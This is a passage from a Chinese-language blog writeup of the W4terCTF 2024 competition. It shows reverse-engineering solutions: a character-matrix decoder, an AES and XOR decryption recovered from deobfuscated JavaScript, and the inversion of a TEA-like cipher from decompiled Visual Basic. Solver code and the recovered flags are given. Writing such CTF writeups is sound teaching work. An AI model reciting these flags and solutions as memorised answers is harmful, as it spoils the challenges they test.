class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>],<br>[<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>]]<br><br>str_array_8020 = [ (<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> line )) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> matrix_8020]<br><br><span class="hljs-comment"># print(str_array_8020)</span><br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> str_array_8020:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        <span class="hljs-keyword">if</span> small_alpha_bet[i][<span class="hljs-number">0</span>:<span class="hljs-number">17</span>] == line:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)),end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        <span class="hljs-keyword">if</span> upper_alpha_bet[i][<span class="hljs-number">0</span>:<span class="hljs-number">17</span>] == line:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">if</span> num_bet[i][<span class="hljs-number">0</span>:<span class="hljs-number">17</span>] == line:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><br></code></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">M O U N D W H I 7 e c r a B s<br></code></pre></td></tr></table></figure>
<p>由此得到flag</p>
<p><code>W4terCTF&#123;1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_MOUND_WHI7e_craBs&#125;</code></p>
<h3 id="DouDou">DouDou</h3>
<p>爬了js下来，用了<code>restringer</code>反混淆，得到关键函数如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">q</span>) &#123;<br>  <span class="hljs-keyword">var</span> V = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(q)),<br>    x = []<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> P = <span class="hljs-number">0</span>; P &lt; <span class="hljs-number">12</span>; P++) &#123;<br>    x.<span class="hljs-title function_">push</span>(<br>      <span class="hljs-title function_">e</span>(q[P])<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">g</span>) =&gt;</span> g.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;0&#x27;</span>))<br>        .<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    )<br>  &#125;<br>  x = x.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">if</span> (x == r + A + s + y + B + F + w + Q + b + p + i + f) &#123;<br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure>
<p>最后<code>x == ...</code>后面的表达式也求出来了，是一个超长16进制字符串，太长不贴了。</p>
<p>分析前面调用<code>check(STEPS)</code>的环节可以得到，<code>q</code>会是一个<code>[[int * 16] * 12]</code>，而函数<code>e</code>，结合hint最终判断为AES加密，key是<code>W4terDr0pCTF2024</code>，但是还没完，加密之前每个字节要先异或一个<code>153</code>。</p>
<p>最后生成的<code>x</code>要等于那个超长字符串，才会进入if内生成flag的过程，得到flag：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">flag = <span class="hljs-string">&#x27;&#x27;</span><br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> P = <span class="hljs-number">0</span>; P &lt; <span class="hljs-number">12</span>; P++) &#123;<br>  res += V[P].<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">g</span>) =&gt;</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(g))<br>&#125;<br>res = res.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> P = <span class="hljs-number">0</span>; P &lt; res.<span class="hljs-property">length</span>; P += <span class="hljs-number">4</span>) &#123;<br>  flag += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-built_in">parseInt</span>(res.<span class="hljs-title function_">slice</span>(P, P + <span class="hljs-number">4</span>), <span class="hljs-number">4</span>))<br>&#125;<br></code></pre></td></tr></table></figure>
<p>大概就是res四个一组，parse成一个四位四进制整数，再转ascii即可。这也就意味着<code>res</code>必须是<code>^[0123]*$</code>，这也可以检验得到res的过程是否正确，反正我们一次就出来了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">final_x = <span class="hljs-string">&quot;91d48f9e77505fe36b1537597d68a8be6ef1ced09bba7c9d4ea6a123042d47bbd5776d7b85eebbb7738de44b9af45f9b706640c8dac77d409ceb067e677e7290401e4852527e119b8095a636d0b628e1161142b7dfcbcf2ef890698ba5d279c78df2348e45d1aef635ebfb841284f6d67d1e9d0f0489bcdc5ba303bc791d0e18e46889fa856a463907d82a8137b7b2a863d1896d4dfcd6b84a2f55b50567f705ea7177187609da2e506182007b7e8244acf62c69de4f511760159ffc6dd8e9f5&quot;</span><br>aes = AES.new(<span class="hljs-string">b&quot;W4terDr0pCTF2024&quot;</span>, AES.MODE_ECB)<br><br>l = []<br><span class="hljs-keyword">while</span> final_x:<br>    part_s = final_x[:<span class="hljs-number">32</span>]<br>    final_x = final_x[<span class="hljs-number">32</span>:]<br>    l2 = []<br>    <span class="hljs-keyword">while</span> part_s:<br>        x = <span class="hljs-built_in">int</span>(part_s[:<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>        l2.append(x)<br>        part_s = part_s[<span class="hljs-number">2</span>:]<br>    l.append(l2)<br><br>l = [[x ^ <span class="hljs-number">153</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> subl] <span class="hljs-keyword">for</span> subl <span class="hljs-keyword">in</span> l]<br>l = [<span class="hljs-built_in">bytes</span>(subl) <span class="hljs-keyword">for</span> subl <span class="hljs-keyword">in</span> l]<br>l = [aes.decrypt(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> l]<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> l:<br>    <span class="hljs-keyword">while</span> s:<br>        b = <span class="hljs-built_in">int</span>(s[:<span class="hljs-number">4</span>], <span class="hljs-number">4</span>)<br>        s = s[<span class="hljs-number">4</span>:]<br>        ans += <span class="hljs-built_in">chr</span>(b)<br>ans<br></code></pre></td></tr></table></figure>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;jS_ls_In7erEStlng_ANd_QuaTeRN4rY_IS_al50_1Unny!!</span>&#x27;<br></code></pre></td></tr></table></figure>
<h3 id="古老的语言">古老的语言</h3>
<p>用VB反编译器逆向，关键函数<code>Fxxxtel</code>如下：</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Public</span> <span class="hljs-keyword">Function</span> Fxxxtel(raw) <span class="hljs-comment">&#x27;40F35C</span><br>  <span class="hljs-comment">&#x27;Data Table: 40E3A8</span><br>  <span class="hljs-keyword">Dim</span> var_B0 <span class="hljs-keyword">As</span> <span class="hljs-type">Long</span><br>  <span class="hljs-keyword">Dim</span> var_B4 <span class="hljs-keyword">As</span> <span class="hljs-type">Long</span><br>  <span class="hljs-keyword">Dim</span> var_B8 <span class="hljs-keyword">As</span> <span class="hljs-type">Long</span><br>  <span class="hljs-keyword">Dim</span> var_BC <span class="hljs-keyword">As</span> <span class="hljs-type">Long</span><br>  <span class="hljs-keyword">Dim</span> var_86 <span class="hljs-keyword">As</span> <span class="hljs-type">Integer</span><br>  loc_40F031: <span class="hljs-keyword">For</span> var_AC = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">9</span> <span class="hljs-keyword">Step</span> <span class="hljs-number">3</span>: var_A6 = var_AC <span class="hljs-comment">&#x27;Integer</span><br>  loc_40F047:   var_B4 = raw(<span class="hljs-built_in">CLng</span>(var_A6))<br>  loc_40F055:   var_B8 = raw(<span class="hljs-built_in">CLng</span>((var_A6 + <span class="hljs-number">1</span>)))<br>  loc_40F063:   var_BC = raw(<span class="hljs-built_in">CLng</span>((var_A6 + <span class="hljs-number">2</span>)))<br>  loc_40F06D:   <span class="hljs-keyword">For</span> var_C0 = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">&amp;H20</span>: var_A8 = var_C0 <span class="hljs-comment">&#x27;Integer</span><br>  loc_40F089:     var_B0 = AddLong(<span class="hljs-number">0</span>, -<span class="hljs-number">1640531527</span>)<br>  loc_40F0FB:     var_B4 = var_B4 <span class="hljs-built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_B8, <span class="hljs-number">4</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">559038737</span>, var_B8 <span class="hljs-built_in">Xor</span> var_B0), RightRotateLong(var_B8, <span class="hljs-number">5</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">1161901314</span>)<br>  loc_40F16D:     var_B8 = var_B8 <span class="hljs-built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_BC, <span class="hljs-number">4</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">559038737</span>, var_BC <span class="hljs-built_in">Xor</span> var_B0), RightRotateLong(var_BC, <span class="hljs-number">5</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">1161901314</span>)<br>  loc_40F1DF:     var_BC = var_BC <span class="hljs-built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_B4, <span class="hljs-number">4</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">559038737</span>, var_B4 <span class="hljs-built_in">Xor</span> var_B0), RightRotateLong(var_B4, <span class="hljs-number">5</span>) <span class="hljs-built_in">Xor</span> -<span class="hljs-number">1161901314</span>)<br>  loc_40F1E5:   <span class="hljs-keyword">Next</span> var_C0 <span class="hljs-comment">&#x27;Integer</span><br>  loc_40F1F4:   var_A0(<span class="hljs-built_in">CLng</span>(var_A6)) = var_B4<br>  loc_40F202:   var_A0(<span class="hljs-built_in">CLng</span>((var_A6 + <span class="hljs-number">1</span>))) = var_B8<br>  loc_40F210:   var_A0(<span class="hljs-built_in">CLng</span>((var_A6 + <span class="hljs-number">2</span>))) = var_BC<br>  loc_40F214: <span class="hljs-keyword">Next</span> var_AC <span class="hljs-comment">&#x27;Integer</span><br>  loc_40F21B: var_86 = <span class="hljs-number">&amp;HFF</span><br></code></pre></td></tr></table></figure>
<p>用C整理出的等价版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v)</span> &#123;<br>  <span class="hljs-type">uint32_t</span> a = v[<span class="hljs-number">0</span>], b = v[<span class="hljs-number">1</span>], c = v[<span class="hljs-number">2</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>    a = a ^ round_fn(b);<br>    b = b ^ round_fn(c);<br>    c = c ^ round_fn(a);<br>  &#125;<br>  v[<span class="hljs-number">0</span>] = a;<br>  v[<span class="hljs-number">1</span>] = b;<br>  v[<span class="hljs-number">2</span>] = c;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">round_fn</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> b)</span> &#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>  <span class="hljs-keyword">return</span> ((left_rotate(b, <span class="hljs-number">4</span>) ^ (<span class="hljs-number">0xdeadbeef</span>)) + (b ^ delta) +<br>          (right_rotate(b, <span class="hljs-number">5</span>) ^ (<span class="hljs-number">0xbabecafe</span>)));<br></code></pre></td></tr></table></figure>
<p>在这之后是一长串的IF，判断<code>var_A0</code>的各个位是否等于一些硬编码的32位常数，将这些常数解密即可。</p>
<p>可以看出这和TEA加密非常像，但是是三个一组的循环混淆，而非经典TEA的两个一组，而且把TEA轮函数加法和异或交换了，以及每次异或的是固定的<code>delta</code>而不是<code>delta</code>的累加。每次取三个<code>u32</code>一组，像这样交叉异或32轮。</p>
<p>三个一组问题不大，把加密的顺序反过来异或回去可以了，原理是一样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v)</span> &#123;<br>  <span class="hljs-type">uint32_t</span> a = v[<span class="hljs-number">0</span>], b = v[<span class="hljs-number">1</span>], c = v[<span class="hljs-number">2</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>    c = c ^ round_fn(a);<br>    b = b ^ round_fn(c);<br>    a = a ^ round_fn(b);<br>  &#125;<br>  v[<span class="hljs-number">0</span>] = a;<br>  v[<span class="hljs-number">1</span>] = b;<br>  v[<span class="hljs-number">2</span>] = c;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>然而这样不对。hint说要关掉的那个选项我看到了，关了之后重新复现了一遍，发现跟之前一点区别没有，心态炸了。</p>
<p>最后一天晚九点，突发奇想把轮函数改了一下，把<code>sum</code>做异或，相当于只把轮函数的加法和异或互换的TEA算法，保留<code>sum</code>的部分不改，然后居然过了，有瞎蒙的成分在。</p>
<p>事后注意到这一行：</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-symbol">loc_40F089:</span>     var_B0 = AddLong(<span class="hljs-number">0</span>, -<span class="hljs-number">1640531527</span>)<br></code></pre></td></tr></table></figure>
<p>那就意味着这一行的逆向是错的，应该是<code>var_B0 = AddLong(var_B0, -1640531527)</code>，不过没发现为什么。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>W4terCTF2024 Writeup</div>
      <div>https://blog.algorithmpark.xyz/2024/04/29/ctf/W4terCTF2024/index/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>CJL, fuusen, unknown25001</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年4月29日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年4月29日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/04/15/signal-and-system/index/" title="信号与系统">
                        <span class="hidden-mobile">信号与系统</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
    <div id="giscus" class="giscus"></div>
    <script type="text/javascript">
      Fluid.utils.loadComments('#giscus', function() {
        var options = {"repo":"algorithmpark/algorithmpark.github.io","repo-id":"R_kgDOKIc7hQ","category":"Announcements","category-id":"DIC_kwDOKIc7hc4CdDq9","theme-light":"dark","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
        var attributes = {};
        for (let option in options) {
          if (!option.startsWith('theme-')) {
            var key = option.startsWith('data-') ? option : 'data-' + option;
            attributes[key] = options[option];
          }
        }
        var light = 'dark';
        var dark = 'dark';
        window.GiscusThemeLight = light;
        window.GiscusThemeDark = dark;
        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
        for (let attribute in attributes) {
          var value = attributes[attribute];
          if (value === undefined || value === null || value === '') {
            delete attributes[attribute];
          }
        }
        var s = document.createElement('script');
        s.setAttribute('src', 'https://giscus.app/client.js');
        s.setAttribute('crossorigin', 'anonymous');
        for (let attribute in attributes) {
          s.setAttribute(attribute, attributes[attribute]);
        }
        var ss = document.getElementsByTagName('script');
        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
        e.parentNode.insertBefore(s, e.nextSibling);
      });
    </script>
    <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  




  <script>
  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
    mermaid.initialize({"theme":"default"});

    Fluid.utils.listenDOMLoaded(function() {
      Fluid.events.registerRefreshCallback(function() {
        if ('mermaid' in window) {
          mermaid.init();
        }
      });
    });
  });
</script>






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://blog.algorithmpark.xyz" target="_blank" rel="nofollow noopener"><span>AlgorithmPark</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/CJL-sysu" target="_blank" rel="nofollow noopener"><span>CJL</span></a> <p><a href="https://icp.gov.moe/?keyword=20240042" target="_blank">萌ICP备20240042号</a></p> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  var relativeDate = function() {
    var updatedTime = document.getElementById('updated-time');
    if (updatedTime) {
      var text = updatedTime.textContent;
      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
      var matchs = text.match(reg);
      if (matchs) {
        var relativeTime = moment(matchs[0]).fromNow();
        updatedTime.textContent = text.replace(reg, relativeTime);
      }
      updatedTime.style.display = '';
    }
  };
  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
    if (!'zh-cn'.startsWith('en')) {
      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
        relativeDate();
      });
    } else {
      relativeDate();
    }
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
